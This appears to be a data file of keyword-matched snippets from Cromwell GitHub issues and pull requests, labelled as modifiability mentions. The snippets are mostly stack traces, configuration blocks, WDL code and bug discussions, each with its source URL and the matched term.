--time=$",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:1491,config,config,1491,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,1,['config'],['config']
Modifiability,"org/snakeyaml/snakeyaml/src/master/CHANGES.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/CHANGES.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/Changelog.rst) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.markdown) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.md) - [Changelog](https://bitbucket.org/snakeyaml/snakeyaml/src/master/changelog.rst). I'll automatically update this PR to resolve conflicts as long as you don't change it yourself. If you'd like to skip this version, you can just close this PR. If you have any feedback, just mention me in the comments below. Configure Scala Steward for your repository with a [`.scala-steward.conf`](https://github.com/scala-steward-org/scala-steward/blob/9367739b48d1bae5766674e547f8cdf8a82d318a/docs/repo-specific-configuration.md) file. Have a fantastic day writing Scala!. <details>; <summary>Files still referring to the old version number</summary>. The following files still refer to the old version number (1.33).; You might want to review and update them manually.; ```; core/src/test/resources/hello_goodbye_scattered_papiv2.json; docs/developers/bitesize/ci/Cromwell_Deployment_Strategies.svg; project/Dependencies.scala; scripts/metadata_comparison/test/resources/comparer/papiv1_version3_good.json; scripts/metadata_comparison/test/resources/comparer/papiv2_version3_good.json; scripts/metadata_comparison/test/resources/comparer/version3_comparison_good.csv; src/ci/resources/papi_v2_reference_image_manifest.conf; ```; </details>; <details>; <summary>Adjust future updates</summary>. Add this to your `.scala-steward.conf` file to ignore future updates of this dependency:; ```; updates.ignore = [ { groupId = ""org.yaml"", artifactId = ""snakeyaml"" } ]; ```; O",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7081:2552,config,configuration,2552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7081,1,['config'],['configuration']
Modifiability,"orkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner$(SharedFileSystemAsyncJobExecutionActor.scala:171); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.makeProcessRunner(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.$anonfun$execute$2(SharedFileSystemAsyncJobExecutionActor.scala:145); at scala.util.Either.fold(Either.scala:188); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAs",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2531,Config,ConfigAsyncJobExecutionActor,2531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"orkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-910401033] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906:13547,Config,ConfigAsyncJobExecutionActor,13547,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"orkflowStoreActor$SubWorkflowStoreCompleteSuccess] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$b#-910401033] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-814c47aa-9d11-4c81-a08c-f2b77c002b46#617869376] was not delivered. [1] dead letters encountered. This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; [2017-01-20 09:33:07,58] [error] WorkflowManagerActor Workflow 814c47aa-9d11-4c81-a08c-f2b77c002b46 failed (during ExecutingWorkflowState): Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; java.lang.RuntimeException: Call aggregate_mafs_workflow.aggregate_mafs:NA:1: return code was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:5255,Config,ConfigAsyncJobExecutionActor,5255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"ort feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. Backend: AWS Batch. <!-- Paste/Attach your workflow if possible: -->. [Workflow](https://github.com/FredHutch/workflow-manager-hackathon/blob/issue/jobdef-error/Workflow/FH-processing-for-variant-discovery-gatk4.wdl). [Input file](https://github.com/FredHutch/workflow-manager-hackathon/blob/issue/jobdef-error/Workflow/FH-M40job.inputs.json). <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. [Configuration file](https://github.com/FredHutch/workflow-manager-hackathon/blob/issue/jobdef-error/Workflow/aws.conf). Running this workflow on AWS Batch (with cromwell-36.jar) consistently fails at the same point each time. . It gets through most (looks like all but one iteration) of the scatter loop that calls the `BaseRecalibrator` task. Then cromwell just sits for a long time (~1hr) with no Batch jobs running (or runnable or starting). Then cromwell calls the `RegisterJobDefinition` API of AWS Batch, and it always fails with the following error message:. ```; 2018-12-15 23:39:03,360 cromwell-system-akka.dispatchers.backend-dispatcher-258 ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(8adb5141)PreProcessingForVariantDiscovery_GATK4.BaseRecalibrator:1:1]: Error attempting to Execute; ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(8adb5141)PreProcessingForVariantDiscovery_GATK4.BaseRecalibrator:1:1]: Error attemptin",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4496:1003,config,configuration,1003,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4496,1,['config'],['configuration']
Modifiability,"ot accept `^chrEBV$|^NC|_random$|Un_|^HLA\-|_alt$|hap\d$` as an input variable via JSON; it will fail to import; * Terra will not accept `^chrEBV$|^NC|_random$|Un_|^HLA\-|_alt$|hap\d$` as an input variable if entered manually; it will throw token recognition error in the workflow menu and not allow you to submit; * Terra will accept the escaped version `^chrEBV$|^NC|_random$|Un_|^HLA\\-|_alt$|hap\\d$` as an input if entered manually or hardcoded, and will interpret it as `^chrEBV$|^NC|_random$|Un_|^HLA\-|_alt$|hap\d$`. Only tested via Terra-Cromwell, as I was previously told local-Cromwell is a lower development priority. ## expected behavior; 1. A user inputting a string as a variable vs that exact same string being a hardcoded default should be handled the same way.; 2. If Cromwell is supposed to handle `/` by requiring they be escaped as `//`, that should be documented if it isn't already.; 3. womtool should throw a warning when it sees a hardcoded variable/default with a `/` inside of it, and that warning should guide the user as to how it will be interpreted at runtime.; 4. The same workflow running in Cromwell and miniwdl should not result in different interpretations of a given string. The WDL spec should be updated to stop inconsistencies like this from happening, [since it currently does not seem to give guidance on this particular issue](https://github.com/openwdl/wdl/blob/main/versions/1.0/SPEC.md#whitespace-strings-identifiers-constants). (Linking WDL 1.0 spec since that's what Cromwell currently supports.). Personally I'd prefer if strings were interpreted literally, ie `/` does not need to be escaped, but that might conflict with the typical JSON standard. Consistency is more important than my mild distaste for escaping. ## related issues; https://github.com/broadinstitute/cromwell/issues/3990#issuecomment-415665749. ## miniwdl comparison (not necessarily the ideal, just to illustrate point 4 on expected behavior); * miniwdl will accept `^chrEBV$|^NC|_",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7167:1948,variab,variable,1948,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7167,1,['variab'],['variable']
Modifiability,"oundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2018-05-02 15:22:54,71] [[38;5;1merror[0m] bc4644da:batch_for_variantcall:-1:1: Hash error, disabling call caching for this job.; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHa",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:6871,Config,ConfigHashingStrategy,6871,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['Config'],['ConfigHashingStrategy']
Modifiability,ove the container after waiting; docker rm `cat ${docker_cid}`. # return exit code; exit $rc. }; }. task kill_docker {. String job_id; String docker_cid; String job_shell. command {; docker kill `cat ${docker_cid}`; }; }; at cromwell.backend.impl.sfs.config.ConfigWdlNamespace.<init>(ConfigWdlNamespace.scala:55); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace$lzycompute(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.configWdlNamespace(ConfigInitializationActor.scala:39); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:42); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.sca,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:4559,Config,ConfigInitializationActor,4559,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['Config'],['ConfigInitializationActor']
Modifiability,overWith(Try.scala:203); 	at cromwell.backend.sfs.SharedFileSystem$class.localizeInputs(SharedFileSystem.scala:199); 	at cromwell.backend.sfs.SharedFileSystemJobCachingActorHelper$$anon$1.localizeInputs(SharedFileSystemJobCachingActorHelper.scala:40); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLinePreProcessor$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.wdl.Command$.instantiate(Command.scala:27); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.instantiatedCommand(StandardAsyncExecutionActor.scala:83); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand$lzycompute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.instantiatedCommand(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.execute(SharedFileSystemAsyncJobExecutionActor.scala:136); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.execute(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:306); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$executeOrRecover$2.apply(StandardAsyncExecutionActor.scala:300); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.executeOrRecover(StandardAsyncExecutionActor.scala:300); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover$1.appl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1950:3385,Config,ConfigAsyncJobExecutionActor,3385,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1950,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"ow, I'm trying to get that WDL uploaded to Terra and the WOMtool validation step continues to pass me a fatal error that I can't seem to figure out. I've reduced the WDL to a single step that can reproduce this error and pasted below. I can't imagine I'm the first person to have this issue, but couldn't find evidence of it on the interwebs! In sum, I have a WDL that appears to be working fine (via miniwdl), but WOMtool (and Dockstore for that matter) finds a fatal error that prevents me from using it on Terra. Please help, thanks!!!. <!-- Are you seeing something that looks like a bug? Please attach as much information as possible. -->; `ERROR: Unexpected symbol (line 6, col 5) when parsing 'setter'. Expected equal, got ""String"". String bam_to_reads_mem_size ^ $setter = :equal $e -> $1 `. <!-- Which backend are you running? -->; `womtool v61`; `miniwdl v1.5.2`. <!-- Paste/Attach your workflow if possible: -->; ```; version 1.0 . #WORKFLOW DEFINITION; workflow StripReadsFromBam {; String bam_to_reads_disk_size; String bam_to_reads_mem_size. #converts BAM to FASTQ (R1 + R2); call BamToReads {; 	input:; 	disk_size = bam_to_reads_disk_size,; 	mem_size = bam_to_reads_mem_size; }. #Outputs single reads file; output {; File outputReads = BamToReads.outputReads; }; }. #Task Definitions; task BamToReads {; File InputBam; String SampleName; String disk_size; String mem_size. #Calls samtools view to do the conversion; command {; #Set -e and -o says if any command I run fails in this script, make sure to return a failure; set -e; set -o pipefail. samtools fastq -c9 -@4 -n -o ${SampleName}.fq.gz ${InputBam} . }. #Run time attributes:; runtime {; docker: ""drpintothe2nd/ac3_xysupp""; memory: mem_size; cpu: ""4""; disks: ""local-disk "" + disk_size + "" HDD""; 	}; ; output {; 	File outputReads = ""${SampleName}.fq.gz""; 	}; }; ```. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; Running locally on windows 10 WSL, ubuntu 20.04",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6767:2298,config,configuration,2298,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6767,1,['config'],['configuration']
Modifiability,"ows one to create a custom `Reporter` to catch `TestFailed` or `TestCanceled` events. A custom reporter could be built that captures the failed and flickering test events and forwards them to an external system for aggregation and reporting. Unfortunately as shown above the behavior of `org.scalatest.Retries.withRetry` is to try twice and upon secondary success return a `TestCanceled` event to each `Reporter` _without_ the original exception. The original error `Outcome` does not seem to be forwarded to the `Reporter`. Instead we may need to implement our own fork of `withRetry` that captures and forwards the original exception before retrying the test, wiring the original error to our custom `Reporter` in some way or via some singleton cache. For an external system to aggregate the errors something like https://logit.io/ could be used but https://sentry.io/ is specifically built for error triage. As the above features will only be implemented for ScalaTest, any tests using ScalaCheck directly should be refactored to use ScalaTest's ""ScalaCheck-style"" property based testing. That way any failing property based tests will be tracked as well using our reporting. Because this feature is likely to be used across all cromwell artifacts/subprojects we should decide if we either want to either:; 1. Update every project in `build.sbt` with a `.dependsOn(common, ""test->test"")`; 2. Add scalatest and sentry as `Provided` dependencies to `common` such that they won't be transitively included by default; 3. Create a new `cromwell.test` artifact and use either of the above outside of `cromwell.common`. **A/C:**; - Switch tests directly using scalacheck over to scalatest's scalacheck-style specs; - Create a custom scalatest helper/reporter that retries a failed test a configurable number of times; - Add custom reporter to scalatest settings in `Testing.scala`; - Assuming using sentry for error reporting from Travis:; - Add sentry DSN configuration values to Vault; - Update `build_a",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3658:2239,refactor,refactored,2239,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3658,1,['refactor'],['refactored']
Modifiability,"p the MySQL server each time before running cromwell; # stand it up on the same node that's running cromwell; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.cj.jdbc.Driver""; url = ""jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true""; user = ""root""; password = ""pass""; connectionTimeout = 5000; }; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }. docker {; hash-lookup {; enabled = true; method = ""remote""; }; }. backend {; # which backend do you want to use?; # Right now I don't know how to choose this via command line, only here; default = ""Local"" # For running jobs on an interactive node; #default = ""SLURM"" # For running jobs by submitting them from an interactive node to the cluster; providers { ; # For running jobs on an interactive node; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; root = ""cromwell-executions""; dockerRoot = ""/cromwell-executions""; runtime-attributes = """"""; String? docker; """"""; submit = ""/usr/bin/env bash ${script}"". # We're asking bash-within-singularity to run the script, but the script's location on the machine; # is different then the location its mounted to in the container, so need to change the path with sed; submit-docker = """"""; singularity exec --containall --bind ${cwd}:${docker_cwd} docker://${docker} bash \; ""$(echo ${script} | sed -e 's@.*cromwell-executions@/cromwell-executions@')""; """"""; filesystems {; local {; localization: [""hard-link""]; caching {; duplication-strategy: [""hard-link""]; hasing-strategy: ""fingerprint""; check-sibling-md5: true; fingerprint-size: 1048576 # 1 MB ; }; }; }; }; }; # For running jobs by submitting them from an interactive node to the cluster; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; root = ""cromwell-executions""; dockerRoot = ""/cromwell-execut",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108:4146,Config,ConfigBackendLifecycleActorFactory,4146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108,2,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,p$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.AbstractIterable.foreach(Iterable.scala:54); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.backend.impl.sfs.config.DeclarationValidation$.fromDeclarations(DeclarationValidation.scala:17); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations$lzycompute(ConfigInitializationActor.scala:38); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.declarationValidations(ConfigInitializationActor.scala:37); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:47); 	at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:46); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.coerceDefaultRuntimeAttributes(SharedFileSystemInitializationActor.scala:90); 	at cromwell.backend.BackendWorkflowInitializationActor$class.validateRuntimeAttributes(BackendWorkflowInitializationActor.scala:138); 	at cromwell.backend.BackendWorkflowInitializationActor$class.initSequence(BackendWorkflowInitializationActor.scala:171); 	at cromwell.backend.sfs.SharedFileSystemInitializationActor.initSequence(SharedFileSystemInitializationActor.scala:37); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1$$anonfun$applyOrElse$4.apply(BackendWorkflowInitializationActor.scala:163); 	at cromwell.b,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1737:2373,Config,ConfigInitializationActor,2373,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1737,1,['Config'],['ConfigInitializationActor']
Modifiability,"p.$anonfun$main$1(App.scala:98); at scala.App.$anonfun$main$1$adapted(App.scala:98); at scala.collection.IterableOnceOps.foreach(IterableOnce.scala:575); at scala.collection.IterableOnceOps.foreach$(IterableOnce.scala:573); at scala.collection.AbstractIterable.foreach(Iterable.scala:933); at scala.App.main(App.scala:98); at scala.App.main$(App.scala:96); at womtool.WomtoolMain$.main(WomtoolMain.scala:27); at womtool.WomtoolMain.main(WomtoolMain.scala); Caused by: com.typesafe.config.ConfigException$IO: application.conf: java.io.IOException: resource not found on classpath: application.conf; at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:190); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:152); at com.typesafe.config.impl.SimpleIncluder.fromBasename(SimpleIncluder.java:185); ... 48 more; Caused by: java.io.IOException: resource not found on classpath: application.conf; at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:726); at com.typesafe.config.impl.Parseable$ParseableResources.rawParseValue(Parseable.java:701); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); ... 51 more; ```. <!-- Which backend are you running? -->. The backend I'm running on is slurm and local . <!-- Paste/Attach your workflow if possible: -->. Workflow link. <!-- Def not an joke about best practices. Also thanks for publishing the gatk best practices and the warp pipelines -->. https://github.com/mmterpstra/Bestie. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. Below are the first few lines of the config shown. ```; #see also https://cromwell.readthedocs.io/en/stable/backends/SLURM/; # include the application.conf at the top; include required(classpath(""application"")); workflow-options {; workflow-failure-mode = ContinueWhilePossible; delete_intermediate_output_files = true; ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:5128,config,config,5128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['config'],['config']
